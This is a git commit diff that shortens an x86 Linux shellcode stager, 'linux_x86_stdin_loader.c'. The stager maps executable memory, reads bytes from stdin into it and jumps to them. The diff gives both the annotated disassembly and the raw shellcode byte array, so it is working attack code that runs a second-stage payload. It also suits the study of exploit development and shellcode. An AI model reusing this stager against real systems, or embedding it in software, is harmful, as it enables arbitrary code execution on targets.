c029f2226bb9224d5fbde7b6528b4915a7cdd3fb
SoulSaber1 <soulsaber1@gmail.com>
2017-05-08 22:05:48 -0400

    cut off some bytes

--- loaders/x86-linux/linux_x86_stdin_loader.c
+++ loaders/x86-linux/linux_x86_stdin_loader.c
@@ -1,34 +1,30 @@
 #include <stdio.h>
 /*
 
-load 1Kb from stdin then exec --  32 Bytes -- 8MAY2017 -- icon
+load 0x7f bytes from stdin then jmp --  29 Bytes -- 8MAY2017 -- icon
 
 0:  31 c0                   xor    eax,eax
-2:  31 db                   xor    ebx,ebx
-4:  50                      push   eax
-5:  6a ff                   push   0xffffffff
-7:  6a 22                   push   0x22
-9:  6a 07                   push   0x7
-b:  b7 04                   mov    bh,0x4
-d:  53                      push   ebx
-e:  50                      push   eax
-f:  89 e3                   mov    ebx,esp
-11: b0 5a                   mov    al,0x5a
-13: cd 80                   int    0x80
-15: 91                      xchg   ecx,eax
-16: 6a 03                   push   0x3
-18: 58                      pop    eax
-19: 5b                      pop    ebx
-1a: 5a                      pop    edx
-1b: cd 80                   int    0x80
-1d: ff e1                   jmp    ecx
+2:  50                      push   eax
+3:  6a ff                   push   0xffffffff
+5:  6a 22                   push   0x22
+7:  6a 07                   push   0x7
+9:  6a 7f                   push   0x7f
+b:  50                      push   eax
+c:  89 e3                   mov    ebx,esp
+e:  b0 5a                   mov    al,0x5a
+10: cd 80                   int    0x80
+12: 91                      xchg   ecx,eax
+13: 6a 03                   push   0x3
+15: 58                      pop    eax
+16: 5b                      pop    ebx
+17: 5a                      pop    edx
+18: cd 80                   int    0x80
+1a: ff e1                   jmp    ecx
 */
 
 char loader[] = \
-"\x31\xC0\x31\xDB\x50\x6A\xFF\x6A\x22\x6A\x07\xB7\x04\x53"
-"\x50\x89\xE3\xB0\x5A\xCD\x80\x91\x6A\x03\x58\x5B\x5A\xCD"
-"\x80\xFF\xE1"
-;
+"\x31\xC0\x50\x6A\xFF\x6A\x22\x6A\x07\x6A\x7F\x50\x89\xE3"
+"\xB0\x5A\xCD\x80\x91\x6A\x03\x58\x5B\x5A\xCD\x80\xFF\xE1";
 
 
 int main(int argc, char **argv){
